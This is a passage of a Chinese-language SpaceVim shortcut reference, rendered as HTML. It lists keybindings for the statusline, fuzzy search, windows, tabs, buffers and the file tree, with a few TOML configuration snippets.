title="状态栏"></a>状态栏</h4><pre><code class="toml">statusline_separator = &#39;arrow&#39;</code></pre><p>状态栏中功能模块内的字符显示与否，快捷键</p><table><thead><tr><th>快捷键</th><th>Unicode</th><th>ASCII</th><th>功能</th></tr></thead><tbody><tr><td><code>SPC t 8</code></td><td>⑧</td><td>8</td><td>高亮指定列后所有字符</td></tr><tr><td><code>SPC t f</code></td><td>ⓕ</td><td>f</td><td>高亮指定列字符</td></tr><tr><td><code>SPC t s</code></td><td>ⓢ</td><td>s</td><td>语法检查</td></tr><tr><td><code>SPC t S</code></td><td>Ⓢ</td><td>S</td><td>拼写检查</td></tr><tr><td><code>SPC t w</code></td><td>ⓦ</td><td>w</td><td>行尾空格检查</td></tr></tbody></table><p>其他快捷键</p><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>SPC t m b</code></td><td>显示/隐藏电池状态 (需要安装 acpi)</td></tr><tr><td><code>SPC t m c</code></td><td>toggle the org task clock (available in org layer)(TODO)</td></tr><tr><td><code>SPC t m i</code></td><td>显示/隐藏输入法</td></tr><tr><td><code>SPC t m m</code></td><td>显示/隐藏 SpaceVim 已启用功能</td></tr><tr><td><code>SPC t m M</code></td><td>显示/隐藏文件类型</td></tr><tr><td><code>SPC t m n</code></td><td>toggle the cat! (if colors layer is declared in your dotfile)(TODO)</td></tr><tr><td><code>SPC t m p</code></td><td>显示/隐藏光标位置信息</td></tr><tr><td><code>SPC t m t</code></td><td>显示/隐藏时间</td></tr><tr><td><code>SPC t m d</code></td><td>显示/隐藏日期</td></tr><tr><td><code>SPC t m T</code></td><td>显示/隐藏状态栏</td></tr><tr><td><code>SPC t m v</code></td><td>显示/隐藏版本控制信息</td></tr></tbody></table><h3 id="模糊搜索"><a href="#模糊搜索" class="headerlink" title="模糊搜索"></a>模糊搜索</h3><h4 id="Denite搜索快捷键"><a href="#Denite搜索快捷键" class="headerlink" title="Denite搜索快捷键"></a>Denite搜索快捷键</h4><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>&lt;Leader&gt; f &lt;Space&gt;</code></td><td>模糊查找快捷键，并执行该快捷键</td></tr><tr><td><code>&lt;Leader&gt; f e</code></td><td>模糊搜索寄存器</td></tr><tr><td><code>&lt;Leader&gt; f h</code></td><td>模糊搜索 history/yank</td></tr><tr><td><code>&lt;Leader&gt; f j</code></td><td>模糊搜索 jump, change</td></tr><tr><td><code>&lt;Leader&gt; f l</code></td><td>模糊搜索 location list</td></tr><tr><td><code>&lt;Leader&gt; f m</code></td><td>模糊搜索 output messages</td></tr><tr><td><code>&lt;Leader&gt; f o</code></td><td>模糊搜索函数列表</td></tr><tr><td><code>&lt;Leader&gt; f q</code></td><td>模糊搜索 quickfix list</td></tr><tr><td><code>&lt;Leader&gt; f r</code></td><td>重置上次搜索窗口</td></tr></tbody></table><h5 id="Denite模糊搜索窗口内的快捷键"><a href="#Denite模糊搜索窗口内的快捷键" class="headerlink" title="Denite模糊搜索窗口内的快捷键"></a>Denite模糊搜索窗口内的快捷键</h5><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>&lt;Tab&gt;</code> / <code>Ctrl-j</code></td><td>下一个选项</td></tr><tr><td><code>Shift-&lt;Tab&gt;</code> / <code>Ctrl-k</code></td><td>上一个选项</td></tr><tr><td><code>jk</code></td><td>离开输入模式（仅支持 denite 和 unite 模块）</td></tr><tr><td><code>Ctrl-w</code></td><td>删除光标前词语</td></tr><tr><td><code>&lt;Enter&gt;</code></td><td>执行默认动作</td></tr><tr><td><code>Ctrl-s</code></td><td>在分割窗口内打开</td></tr><tr><td><code>Ctrl-v</code></td><td>在垂直分割窗口内打开</td></tr><tr><td><code>Ctrl-t</code></td><td>在新的标签页里打开</td></tr><tr><td><code>Ctrl-g</code></td><td>推出模糊搜索插件</td></tr></tbody></table><h5 id="Denite模块可视模式下快捷键"><a href="#Denite模块可视模式下快捷键" class="headerlink" title="Denite模块可视模式下快捷键"></a>Denite模块可视模式下快捷键</h5><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>Ctrl</code>+<code>h/k/l/r</code></td><td>未定义</td></tr><tr><td><code>Ctrl</code>+<code>l</code></td><td>刷新窗口</td></tr><tr><td><code>&lt;Tab&gt;</code></td><td>选择即将执行的动作</td></tr><tr><td><code>Space</code></td><td>切换标记当前选项</td></tr><tr><td><code>r</code></td><td>替换或者重命名</td></tr><tr><td><code>Ctrl</code>+<code>z</code></td><td>切换窗口分割方式</td></tr></tbody></table><h4 id="实时代码检索"><a href="#实时代码检索" class="headerlink" title="实时代码检索"></a>实时代码检索</h4><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>SPC s /</code></td><td>在工程中使用默认工具实时检索代码</td></tr></tbody></table><h5 id="Flygrep-搜索窗口结果窗口内的常用快捷键："><a href="#Flygrep-搜索窗口结果窗口内的常用快捷键：" class="headerlink" title="Flygrep 搜索窗口结果窗口内的常用快捷键："></a>Flygrep 搜索窗口结果窗口内的常用快捷键：</h5><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>&lt;Esc&gt;</code></td><td>关闭搜索窗口</td></tr><tr><td><code>&lt;Enter&gt;</code></td><td>打开当前选中的文件位置</td></tr><tr><td><code>Ctrl-t</code></td><td>在新标签栏打开选中项</td></tr><tr><td><code>Ctrl-s</code></td><td>在分屏打开选中项</td></tr><tr><td><code>Ctrl-v</code></td><td>在垂直分屏打开选中项</td></tr><tr><td><code>Ctrl-q</code></td><td>将搜索结果转移至 quickfix</td></tr><tr><td><code>&lt;Tab&gt;</code></td><td>选中下一行文件位置</td></tr><tr><td><code>Shift-&lt;Tab&gt;</code></td><td>选中上一行文件位置</td></tr><tr><td><code>&lt;Backspace&gt;</code></td><td>删除上一个输入字符</td></tr><tr><td><code>Ctrl-w</code></td><td>删除光标前的单词</td></tr><tr><td><code>Ctrl-u</code></td><td>删除光标所在行的内容</td></tr><tr><td><code>Ctrl-k</code></td><td>删除光标后所有内容</td></tr><tr><td><code>Ctrl-a</code> / <code>&lt;Home&gt;</code></td><td>将光标移至行首</td></tr><tr><td><code>Ctrl-e</code> / <code>&lt;End&gt;</code></td><td>将光标移至行尾</td></tr></tbody></table><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><h4 id="光标及滚屏操作"><a href="#光标及滚屏操作" class="headerlink" title="光标及滚屏操作"></a>光标及滚屏操作</h4><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>h</code></td><td>向左移动光标</td></tr><tr><td><code>j</code></td><td>向下移动光标</td></tr><tr><td><code>k</code></td><td>向上移动光标</td></tr><tr><td><code>l</code></td><td>向右移动光标</td></tr><tr><td><code>&lt;Up&gt;</code></td><td>向上移动光标，不跳过折行</td></tr><tr><td><code>&lt;Down&gt;</code></td><td>向下移动光标，不跳过折行</td></tr><tr><td><code>H</code></td><td>移动光标至屏幕顶部</td></tr><tr><td><code>M</code></td><td>移动光标至屏幕中部</td></tr><tr><td><code>L</code></td><td>移动光标至屏幕底部</td></tr><tr><td><code>&#125;</code></td><td>向前移动一个段落</td></tr><tr><td><code>&#123;</code></td><td>向后移动一个段落</td></tr><tr><td><code>Ctrl-f</code></td><td>向下翻页 (<code>Ctrl-f</code> / <code>Ctrl-d</code>)</td></tr><tr><td><code>Ctrl-b</code></td><td>向上翻页 (<code>C-b</code> / <code>C-u</code>)</td></tr><tr><td><code>Ctrl-e</code></td><td>向下滚屏 (<code>3 Ctrl-e/j</code>)</td></tr><tr><td><code>Ctrl-y</code></td><td>向上滚屏 (<code>3Ctrl-y/k</code>)</td></tr><tr><td><code>Ctrl-Shift-Up</code></td><td>向上移动当前行</td></tr><tr><td><code>Ctrl-Shift-Down</code></td><td>向下移动当前行</td></tr></tbody></table><h4 id="命令行Ex模式"><a href="#命令行Ex模式" class="headerlink" title="命令行Ex模式"></a>命令行Ex模式</h4><p>常规模式下按下<code>:</code> 键后，可进入命令行Ex模式，</p><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>Ctrl-a</code></td><td>移动光标至行首</td></tr><tr><td><code>Ctrl-b</code></td><td>向左移动光标</td></tr><tr><td><code>Ctrl-f</code></td><td>向右移动光标</td></tr><tr><td><code>Ctrl-w</code></td><td>删除光标前词</td></tr><tr><td><code>Ctrl-u</code></td><td>移除光标前所有字符</td></tr><tr><td><code>Ctrl-k</code></td><td>移除光标后所有字符</td></tr><tr><td><code>Ctrl-c</code>/<code>Esc</code></td><td>离开命令行模式</td></tr><tr><td><code>Tab</code></td><td>选择下一个匹配</td></tr><tr><td><code>Shift-Tab</code></td><td>选择上一个匹配</td></tr></tbody></table><h4 id="快速定位操作"><a href="#快速定位操作" class="headerlink" title="快速定位操作"></a>快速定位操作</h4><p>easy-motion快捷键 <code>&lt;Leader&gt; \</code></p><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>&lt;Leader&gt;f&#123;char&#125;</code></td><td>Find {char} to the right. See f.</td></tr><tr><td><code>&lt;Leader&gt;F&#123;char&#125;</code></td><td>Find {char} to the left. See F.</td></tr><tr><td><code>&lt;Leader&gt;t&#123;char&#125;</code></td><td>Till before the {char} to the right. See t.</td></tr><tr><td><code>&lt;Leader&gt;T&#123;char&#125;</code></td><td>Till after the {char} to the left. See T.</td></tr><tr><td><code>&lt;Leader&gt;w</code></td><td>Beginning of word forward. See w.</td></tr><tr><td><code>&lt;Leader&gt;W</code></td><td>Beginning of WORD forward. See W.</td></tr><tr><td><code>&lt;Leader&gt;b</code></td><td>Beginning of word backward. See b.</td></tr><tr><td><code>&lt;Leader&gt;B</code></td><td>Beginning of WORD backward. See B.</td></tr><tr><td><code>&lt;Leader&gt;e</code></td><td>End of word forward. See e.</td></tr><tr><td><code>&lt;Leader&gt;E</code></td><td>End of WORD forward. See E.</td></tr><tr><td><code>&lt;Leader&gt;ge</code></td><td>End of word backward. See ge.</td></tr><tr><td><code>&lt;Leader&gt;gE</code></td><td>End of WORD backward. See gE.</td></tr><tr><td><code>&lt;Leader&gt;j</code></td><td>Line downward. See j.</td></tr><tr><td><code>&lt;Leader&gt;k</code></td><td>Line upward. See k.</td></tr><tr><td><code>&lt;Leader&gt;n</code></td><td>Jump to latest “/” or “?” forward. See n.</td></tr><tr><td><code>&lt;Leader&gt;N</code></td><td>Jump to latest “/” or “?” backward. See N.</td></tr><tr><td><code>&lt;Leader&gt;s</code></td><td>Find(Search) {char} forward and backward.</td></tr></tbody></table><h4 id="对齐操作"><a href="#对齐操作" class="headerlink" title="对齐操作"></a>对齐操作</h4><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>SPC x a #</code></td><td>基于分隔符 # 进行文本对齐</td></tr><tr><td><code>SPC x t c</code></td><td>交换当前字符和前一个字符的位置</td></tr><tr><td><code>SPC x t C</code></td><td>交换当前字符和后一个字符的位置</td></tr><tr><td><code>SPC x t w</code></td><td>交换当前单词和前一个单词的位置</td></tr><tr><td><code>SPC x t W</code></td><td>交换当前单词和后一个单词的位置</td></tr><tr><td><code>SPC x t l</code></td><td>交换当前行和前一行的位置</td></tr><tr><td><code>SPC x t L</code></td><td>交换当前行和后一行的位置</td></tr><tr><td><code>SPC x u</code></td><td>将选中字符串转为小写</td></tr><tr><td><code>SPC x U</code></td><td>将选中字符串转为大写</td></tr><tr><td><code>SPC x w c</code></td><td>统计选中区域的单词数</td></tr><tr><td><code>SPC x w d</code></td><td>show dictionary entry of word from <a href="http://wordnik.com/">wordnik.com</a> (TODO)</td></tr><tr><td><code>SPC x &lt;Tab&gt;</code></td><td>indent or dedent a region rigidly (TODO)</td></tr></tbody></table><h4 id="复制-粘贴"><a href="#复制-粘贴" class="headerlink" title="复制/粘贴"></a>复制/粘贴</h4><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>&lt;Leader&gt; p</code></td><td>粘贴系统剪切板文字至当前位置之后</td></tr><tr><td><code>&lt;Leader&gt; P</code></td><td>粘贴系统剪切板文字至当前位置之前</td></tr></tbody></table><h4 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h4><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>SPC j d</code></td><td>跳至当前目录某个文件夹</td></tr><tr><td><code>SPC j D</code></td><td>跳至当前目录某个文件夹（在另外窗口展示文件列表）</td></tr><tr><td><code>SPC j i</code></td><td>跳至当前文件的某个函数，使用 Denite 打开语法树</td></tr><tr><td><code>SPC j u</code></td><td>跳至窗口某个 URL</td></tr><tr><td><code>SPC j v</code></td><td>跳至某个 Vim 函数的定义处</td></tr><tr><td><code>SPC j w</code></td><td>跳至 Buffer 中某个单词 (easymotion)</td></tr></tbody></table><h3 id="其他操作"><a href="#其他操作" class="headerlink" title="其他操作"></a>其他操作</h3><h4 id="以g为前缀的快捷键"><a href="#以g为前缀的快捷键" class="headerlink" title="以g为前缀的快捷键"></a>以<code>g</code>为前缀的快捷键</h4><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>g &#39;</code></td><td>跳至标签</td></tr><tr><td><code>g a</code></td><td>打印光标字符的 ascii 值</td></tr><tr><td><code>g d</code></td><td>跳至定义处</td></tr></tbody></table><h4 id="以z为前缀的快捷键"><a href="#以z为前缀的快捷键" class="headerlink" title="以z为前缀的快捷键"></a>以<code>z</code>为前缀的快捷键</h4><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>z =</code></td><td>spelling suggestions</td></tr><tr><td><code>z A</code></td><td>toggle folds recursively</td></tr><tr><td><code>z C</code></td><td>close folds recursively</td></tr><tr><td><code>z D</code></td><td>delete folds recursively</td></tr><tr><td><code>z E</code></td><td>eliminate all folds</td></tr><tr><td><code>z a</code></td><td>toggle a fold</td></tr><tr><td><code>z b</code></td><td>redraw, cursor line at bottom</td></tr><tr><td><code>z c</code></td><td>close a fold</td></tr><tr><td><code>z d</code></td><td>delete a fold</td></tr><tr><td><code>z e</code></td><td>right scroll horizontally to cursor position</td></tr><tr><td><code>z f</code></td><td>create a fold for motion</td></tr><tr><td><code>z g</code></td><td>mark good spelled</td></tr><tr><td><code>z h</code></td><td>scroll screen N characters to right</td></tr><tr><td><code>z i</code></td><td>toggle foldenable</td></tr><tr><td><code>z j</code></td><td>mode to start of next fold</td></tr><tr><td><code>z k</code></td><td>mode to end of previous fold</td></tr><tr><td><code>z l</code></td><td>scroll screen N characters to left</td></tr><tr><td><code>z m</code></td><td>subtract one from <code>foldlevel</code></td></tr><tr><td><code>z n</code></td><td>reset <code>foldenable</code></td></tr><tr><td><code>z o</code></td><td>open fold</td></tr></tbody></table><h4 id="移动代码块"><a href="#移动代码块" class="headerlink" title="移动代码块"></a>移动代码块</h4><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>&lt;</code> / <code>Shift-Tab</code></td><td>向左移动文本</td></tr><tr><td><code>&gt;</code> / <code>Tab</code></td><td>向右移动文本</td></tr><tr><td><code>Ctrl-Shift-Up</code></td><td>向上移动选中行</td></tr><tr><td><code>Ctrl-Shift-Down</code></td><td>向下移动选中行</td></tr></tbody></table><h4 id="代码缩进"><a href="#代码缩进" class="headerlink" title="代码缩进"></a>代码缩进</h4><pre><code class="toml">[options]default_indent = 2expand_tab = true</code></pre><h4 id="增减数字"><a href="#增减数字" class="headerlink" title="增减数字"></a>增减数字</h4><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>SPC n +</code></td><td>为光标下的数字加 1 并进入 临时快捷键状态</td></tr><tr><td><code>SPC n -</code></td><td>为光标下的数字减 1 并进入 临时快捷键状态</td></tr></tbody></table><p> <code>10 SPC n +</code> 将为光标下的数字加 <code>10</code></p><h4 id="增删注释"><a href="#增删注释" class="headerlink" title="增删注释"></a>增删注释</h4><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>SPC ;</code></td><td>进入注释操作模式</td></tr><tr><td><code>SPC c l</code></td><td>注释/反注释当前行</td></tr><tr><td><code>SPC c u</code></td><td>反注释行</td></tr><tr><td><code>SPC c p</code></td><td>注释/反注释段落</td></tr><tr><td><code>SPC c t</code></td><td>注释/反注释到行</td></tr></tbody></table><p><code>SPC ; 4 j</code>，这个组合键会注释当前行以及下方的 4 行。这个数字即为相对行号</p><h4 id="编辑历史记录"><a href="#编辑历史记录" class="headerlink" title="编辑历史记录"></a>编辑历史记录</h4><p>快捷键 <code>F7</code> 查看，默认会在左侧打开一个编辑历史可视化窗口</p><p>在编辑历史窗口内的快捷键如下：</p><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>?</code></td><td>toggle_help</td></tr><tr><td><code>G</code></td><td>move_bottom</td></tr><tr><td><code>J</code></td><td>move_older_write</td></tr><tr><td><code>K</code></td><td>move_newer_write</td></tr><tr><td><code>P</code></td><td>play_to</td></tr><tr><td><code>/</code></td><td>search</td></tr><tr><td><code>&lt;CR&gt;</code></td><td>preview</td></tr><tr><td><code>d</code></td><td>diff</td></tr><tr><td><code>i</code></td><td>toggle_inline</td></tr><tr><td><code>j</code></td><td>move_older</td></tr><tr><td><code>k</code></td><td>move_newer</td></tr><tr><td><code>n</code></td><td>next_match</td></tr><tr><td><code>o</code></td><td>preview</td></tr><tr><td><code>q</code></td><td>quit</td></tr><tr><td><code>r</code></td><td>diff</td></tr><tr><td><code>gg</code></td><td>move_top</td></tr></tbody></table><h3 id="窗口window管理"><a href="#窗口window管理" class="headerlink" title="窗口window管理"></a>窗口window管理</h3><p>窗口管理快捷键有一个统一的前缀，默认的前缀 <code>[Window]</code> 是按键 <code>s</code></p><pre><code class="toml">[options]windows_leader = &quot;s&quot;</code></pre><p>常见编辑器窗口</p><table><thead><tr><th>按键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>&lt;F1&gt;</code></td><td>打开VIM帮助文档</td></tr><tr><td><code>&lt;F2&gt;</code></td><td>打开、关闭语法树/toc</td></tr><tr><td><code>&lt;F3&gt;</code></td><td>打开、关闭文件树</td></tr><tr><td><code>&lt;F7&gt;</code></td><td>打开、关闭历史编辑窗口</td></tr><tr><td><code>Ctrl-&lt;Down&gt;</code></td><td>切换至下方窗口</td></tr><tr><td><code>Ctrl-&lt;Up&gt;</code></td><td>切换至上方窗口</td></tr><tr><td><code>Ctrl-&lt;Left&gt;</code></td><td>切换至左边窗口</td></tr><tr><td><code>Ctrl-&lt;Right&gt;</code></td><td>切换至右边窗口</td></tr></tbody></table><h4 id="窗口跳转"><a href="#窗口跳转" class="headerlink" title="窗口跳转"></a>窗口跳转</h4><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>SPC 1～9</code></td><td>跳至窗口 1～9</td></tr></tbody></table><h4 id="窗口分屏操作"><a href="#窗口分屏操作" class="headerlink" title="窗口分屏操作"></a>窗口分屏操作</h4><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>q</code></td><td>智能关闭当前窗口</td></tr><tr><td><code>[Window] v</code></td><td>水平分屏</td></tr><tr><td><code>[Window] V</code></td><td>水平分屏，并编辑上一个文件</td></tr><tr><td><code>[Window] g</code></td><td>垂直分屏</td></tr><tr><td><code>[Window] G</code></td><td>垂直分屏，并编辑上一个文件</td></tr><tr><td><code>[Window] t</code></td><td>新建新的标签页</td></tr><tr><td><code>[Window] o</code></td><td>关闭其他窗口</td></tr><tr><td><code>[Window] x</code></td><td>关闭当前缓冲区，并保留新的空白缓冲区</td></tr><tr><td><code>[Window] q</code></td><td>关闭当前缓冲区</td></tr><tr><td><code>[Window] Q</code></td><td>关闭当前窗口</td></tr><tr><td><code>Shift-&lt;Tab&gt;</code></td><td>切换至前一窗口</td></tr></tbody></table><p>常规模式下的按键 <code>q</code> 被用来快速关闭窗口，其原生的功能可以使用 <code>&lt;Leader&gt; q r</code> 来代替。</p><h4 id="窗口其他操作"><a href="#窗口其他操作" class="headerlink" title="窗口其他操作"></a>窗口其他操作</h4><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>SPC w .</code></td><td>启用窗口临时快捷键</td></tr><tr><td><code>SPC w &lt;Tab&gt;</code></td><td>在同一标签内进行窗口切换</td></tr><tr><td><code>SPC w =</code></td><td>对齐分离的窗口</td></tr><tr><td><code>SPC w c</code></td><td>进入阅读模式，浏览当前窗口 (需要 tools 模块)</td></tr><tr><td><code>SPC w C</code></td><td>选择某一个窗口，并且进入阅读模式 (需要 tools 模块)</td></tr><tr><td><code>SPC w d</code></td><td>删除一个窗口</td></tr><tr><td><code>SPC w D</code></td><td>选择一个窗口并关闭</td></tr><tr><td><code>SPC w F</code></td><td>新建一个新的标签页</td></tr><tr><td><code>SPC w h</code></td><td>移至左边窗口</td></tr><tr><td><code>SPC w H</code></td><td>将窗口向左移动</td></tr><tr><td><code>SPC w j</code></td><td>移至下方窗口</td></tr><tr><td><code>SPC w J</code></td><td>将窗口向下移动</td></tr><tr><td><code>SPC w k</code></td><td>移至上方窗口</td></tr><tr><td><code>SPC w K</code></td><td>将窗口向上移动</td></tr><tr><td><code>SPC w l</code></td><td>移至右方窗口</td></tr><tr><td><code>SPC w L</code></td><td>将窗口向右移动</td></tr><tr><td><code>SPC w m</code></td><td>最大化/最小化窗口（最大化相当于关闭其它窗口）</td></tr><tr><td><code>SPC w M</code></td><td>选择窗口进行替换</td></tr><tr><td><code>SPC w o</code></td><td>按序切换标签页</td></tr><tr><td><code>SPC w p m</code></td><td>使用弹窗打开消息</td></tr><tr><td><code>SPC w p p</code></td><td>关闭当前弹窗窗口</td></tr><tr><td><code>SPC w r</code></td><td>顺序切换窗口</td></tr><tr><td><code>SPC w R</code></td><td>逆序切换窗口</td></tr><tr><td><code>SPC w s/-</code></td><td>水平分割窗口</td></tr><tr><td><code>SPC w S</code></td><td>水平分割窗口，并切换至新窗口</td></tr><tr><td><code>SPC w u</code></td><td>恢复窗口布局</td></tr><tr><td><code>SPC w U</code></td><td>撤销恢复窗口布局</td></tr><tr><td><code>SPC w v//</code></td><td>垂直分离窗口</td></tr><tr><td><code>SPC w V</code></td><td>垂直分离窗口，并切换至新窗口</td></tr><tr><td><code>SPC w w</code></td><td>切换至前一窗口</td></tr><tr><td><code>SPC w W</code></td><td>选择一个窗口</td></tr><tr><td><code>SPC w x</code></td><td>切换窗口文件</td></tr></tbody></table><h3 id="标签tab管理"><a href="#标签tab管理" class="headerlink" title="标签tab管理"></a>标签tab管理</h3><h4 id="标签管理器"><a href="#标签管理器" class="headerlink" title="标签管理器"></a>标签管理器</h4><p>可使用 <code>SPC t t</code> 打开内置的标签管理器，标签管理器内的快捷键如下：</p><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>o</code></td><td>展开或关闭标签目录</td></tr><tr><td><code>r</code></td><td>重命名光标下的标签页</td></tr><tr><td><code>n</code></td><td>在光标位置下新建命名标签页</td></tr><tr><td><code>N</code></td><td>在光标位置下新建匿名标签页</td></tr><tr><td><code>x</code></td><td>删除光标下的标签页</td></tr><tr><td><code>Ctrl-S-&lt;Up&gt;</code></td><td>向上移动光标下的标签页</td></tr><tr><td><code>Ctrl-S-&lt;Down&gt;</code></td><td>向下移动光标下的标签页</td></tr><tr><td><code>&lt;Enter&gt;</code></td><td>跳至光标所对应的标签窗口</td></tr></tbody></table><h4 id="标签跳转"><a href="#标签跳转" class="headerlink" title="标签跳转"></a>标签跳转</h4><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>&lt;Leader&gt; 1~0</code></td><td>跳至标签栏序号 1~10</td></tr><tr><td><code>&lt;Leader&gt; &lt;Shift&gt; 1~9</code></td><td>跳至标签栏序号 11~20</td></tr><tr><td><code>&lt;Mouse-left&gt;</code></td><td>切换至该标签</td></tr><tr><td><code>&lt;Mouse-middle&gt;</code></td><td>删除该标签</td></tr></tbody></table><h3 id="缓冲区Buffer管理"><a href="#缓冲区Buffer管理" class="headerlink" title="缓冲区Buffer管理"></a>缓冲区Buffer管理</h3><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>SPC b .</code></td><td>启用缓冲区临时快捷键</td></tr><tr><td><code>SPC b b</code></td><td>通过模糊搜索工具进行缓冲区切换，需要启用一个模糊搜索工具模块</td></tr><tr><td><code>SPC b h</code></td><td>打开欢迎界面, 等同于快捷键 <code>SPC a s</code></td></tr><tr><td><code>SPC b m</code></td><td>打开消息缓冲区</td></tr></tbody></table><p>缓冲区（Buffer）操作相关快捷键都是以 <code>SPC b</code> 为前缀的</p><h4 id="新建空白buffer"><a href="#新建空白buffer" class="headerlink" title="新建空白buffer"></a>新建空白buffer</h4><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>SPC b N h</code></td><td>在左侧新建一个窗口，并在其中新建空白 buffer</td></tr><tr><td><code>SPC b N j</code></td><td>在下方新建一个窗口，并在其中新建空白 buffer</td></tr><tr><td><code>SPC b N k</code></td><td>在上方新建一个窗口，并在其中新建空白 buffer</td></tr><tr><td><code>SPC b N l</code></td><td>在右侧新建一个窗口，并在其中新建空白 buffer</td></tr><tr><td><code>SPC b N n</code></td><td>在当前窗口新建一个空白 buffer</td></tr></tbody></table><h4 id="切换buffer"><a href="#切换buffer" class="headerlink" title="切换buffer"></a>切换buffer</h4><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>SPC &lt;Tab&gt;</code></td><td>切换至前一缓冲区，常用于两个缓冲区来回切换</td></tr><tr><td><code>SPC b n</code></td><td>切换至下一个缓冲区，排除特殊插件的缓冲区</td></tr><tr><td><code>SPC b p</code></td><td>切换至前一个缓冲区，排除特殊插件的缓冲区</td></tr><tr><td><code>SPC b P</code></td><td>使用系统剪切板内容替换当前缓冲区</td></tr><tr><td><code>SPC b R</code></td><td>从磁盘重新读取当前缓冲区所对应的文件</td></tr><tr><td><code>SPC b s</code></td><td>switch to the <em>scratch</em> buffer (create it if needed) (TODO)</td></tr><tr><td><code>SPC b w</code></td><td>切换只读权限</td></tr><tr><td><code>SPC b Y</code></td><td>将整个缓冲区复制到系统剪切板</td></tr><tr><td><code>z f</code></td><td>Make current function or comments visible in buffer as much as possible (TODO)</td></tr></tbody></table><h4 id="删除buffer"><a href="#删除buffer" class="headerlink" title="删除buffer"></a>删除buffer</h4><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>SPC b d</code></td><td>删除当前缓冲区，但保留编辑窗口</td></tr><tr><td><code>SPC u SPC b d</code></td><td>kill the current buffer and window (does not delete the visited file) (TODO)</td></tr><tr><td><code>SPC b D</code></td><td>选择一个窗口，并删除其缓冲区</td></tr><tr><td><code>SPC u SPC b D</code></td><td>kill a visible buffer and its window using ace-window(TODO)</td></tr><tr><td><code>SPC b c</code></td><td>删除其它已保存的缓冲区</td></tr><tr><td><code>SPC b C-d</code></td><td>删除其它所有缓冲区</td></tr><tr><td><code>SPC b C-D</code></td><td>kill buffers using a regular expression(TODO)</td></tr><tr><td><code>SPC b e</code></td><td>清除当前缓冲区内容，需要手动确认</td></tr><tr><td><code>SPC u SPC b m</code></td><td>kill all buffers and windows except the current one(TODO)</td></tr></tbody></table><h3 id="文件浏览器"><a href="#文件浏览器" class="headerlink" title="文件浏览器"></a>文件浏览器</h3><p>默认的快捷键是<code>F3</code>, SpaceVim 也提供了另外一组快捷键 <code>SPC f t</code> 和 <code>SPC f T</code> 来打开文件树</p><pre><code class="toml">[options]# 文件树插件可选值包括：# - vimfiler （默认）# - nerdtree# - defxfilemanager = &quot;defx&quot;filetree_direction = &quot;right&quot;</code></pre><h4 id="文件浏览器内的快捷键"><a href="#文件浏览器内的快捷键" class="headerlink" title="文件浏览器内的快捷键"></a>文件浏览器内的快捷键</h4><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>&lt;F3&gt;</code> / <code>SPC f t</code></td><td>切换文件树</td></tr><tr><td><strong>文件树内的快捷键</strong></td><td></td></tr><tr><td><code>&lt;Left&gt;</code> / <code>h</code></td><td>移至父目录，并关闭文件夹</td></tr><tr><td><code>&lt;Down&gt;</code> / <code>j</code></td><td>向下移动光标</td></tr><tr><td><code>&lt;Up&gt;</code> / <code>k</code></td><td>向上移动光标</td></tr><tr><td><code>&lt;Right&gt;</code> / <code>l</code></td><td>展开目录，或打开文件</td></tr><tr><td><code>N</code></td><td>在光标位置新建文件</td></tr><tr><td><code>y y</code></td><td>复制光标下文件路径至系统剪切板</td></tr><tr><td><code>y Y</code></td><td>复制光标下文件至系统剪切板</td></tr><tr><td><code>P</code></td><td>在光标位置黏贴文件</td></tr><tr><td><code>.</code></td><td>切换显示隐藏文件</td></tr><tr><td><code>s v</code></td><td>分屏编辑该文件</td></tr><tr><td><code>s g</code></td><td>垂直分屏编辑该文件</td></tr><tr><td><code>p</code></td><td>预览文件</td></tr><tr><td><code>i</code></td><td>切换至文件夹历史</td></tr><tr><td><code>v</code></td><td>快速查看</td></tr><tr><td><code>&gt;</code></td><td>放大文件树窗口宽度</td></tr><tr><td><code>&lt;</code></td><td>缩小文件树窗口宽度</td></tr><tr><td><code>g x</code></td><td>使用相关程序执行该文件</td></tr><tr><td><code>&#39;</code></td><td>标记光标下的文件（夹）</td></tr><tr><td><code>V</code></td><td>清除所有标记</td></tr><tr><td><code>Ctrl</code>+<code>r</code></td><td>刷新页面</td></tr></tbody></table><h4 id="文件分屏操作"><a 